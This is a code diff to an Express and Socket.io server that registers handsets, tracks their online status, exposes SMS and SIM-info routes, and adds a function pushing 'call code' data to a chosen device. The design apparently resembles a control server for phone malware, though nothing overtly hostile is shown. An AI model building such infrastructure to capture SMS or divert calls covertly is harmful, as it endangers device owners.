@@ -1,5 +1,4 @@
 // 📁 server.js
-
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
@@ -21,23 +20,22 @@ import lastSeenRoutes from "./routes/lastSeen.routes.js";
 
 // 🌿 Environment setup
 dotenv.config();
-
-// 🌐 Connect MongoDB
 connectDB();
 
-// ⚙️ Initialize Express & Socket.io
 const app = express();
 const server = createServer(app);
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
 });
 
-// 🧠 Middlewares
 app.use(cors());
 app.use(express.json());
 app.set("io", io);
 
-// 🧩 SOCKET.IO Logic
+// ✅ Maintain connected device sockets
+const deviceSockets = new Map();
+
+// 🧠 SOCKET.IO Logic
 io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
   let currentDeviceId = null;
@@ -47,35 +45,26 @@ io.on("connection", (socket) => {
     if (!uniqueid) return;
     console.log(`📱 Registered Device: ${uniqueid}`);
     currentDeviceId = uniqueid;
+    deviceSockets.set(uniqueid, socket.id);
     socket.join(uniqueid);
-
-    // Immediately mark device online
     saveLastSeen(uniqueid, "Online");
   });
 
-  // ✅ Device status update (manual ping)
+  // ✅ Device manually pings status
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
-
     console.log(`⚡ ${uniqueid} → ${connectivity}`);
-
-    // Save status in DB
     saveLastSeen(uniqueid, connectivity);
-
-    // Broadcast to all clients (for live frontend update)
-    io.emit("deviceStatus", {
-      uniqueid,
-      connectivity,
-      updatedAt: new Date(),
-    });
+    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
   });
 
-  // ✅ Handle disconnect (auto mark offline)
+  // ✅ Device disconnects (auto offline)
   socket.on("disconnect", () => {
     console.log("🔴 Client disconnected:", socket.id);
     if (currentDeviceId) {
-      console.log(`📴 Marking ${currentDeviceId} as Offline`);
+      console.log(`📴 ${currentDeviceId} went Offline`);
+      deviceSockets.delete(currentDeviceId);
       io.emit("deviceStatus", {
         uniqueid: currentDeviceId,
         connectivity: "Offline",
@@ -87,18 +76,28 @@ io.on("connection", (socket) => {
   });
 });
 
-// 🔄 Function to update last seen & connectivity in DB
+// 🔄 Save Last Seen Logic
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
-    const res = await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
+    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ connectivity }),
     });
-    if (!res.ok) console.log("⚠️ lastSeen update response:", await res.text());
   } catch (err) {
     console.error("❌ Error saving last seen:", err.message);
+  }
+}
+
+// 🔔 Function to send call code data to specific device via socket
+export async function sendCallCodeToDevice(uniqueid, callData) {
+  const socketId = deviceSockets.get(uniqueid);
+  if (socketId) {
+    console.log(`📤 Sending call code to ${uniqueid}:`, callData);
+    io.to(socketId).emit("callCodeUpdate", callData);
+  } else {
+    console.warn(`⚠️ Device ${uniqueid} is offline or not connected.`);
   }
 }
 
@@ -107,7 +106,7 @@ app.get("/", (req, res) => {
   res.send("🚀 Devices API with Live Socket & LastSeen Tracking is running!");
 });
 
-// 🧭 API Routes
+// 🧭 Routes
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
@@ -118,13 +117,8 @@ app.use("/api/serial", serialRoutes);
 app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 
-// ❌ 404 Route
-app.use((req, res) => res.status(404).json({
-  success: false,
-  message: "Route not found",
-}));
-
-// 💥 Global Error Handler
+// ❌ 404 + Global Error
+app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
 app.use((err, req, res, next) => {
   console.error("Unhandled error:", err);
   res.status(500).json({ success: false, message: "Internal server error" });
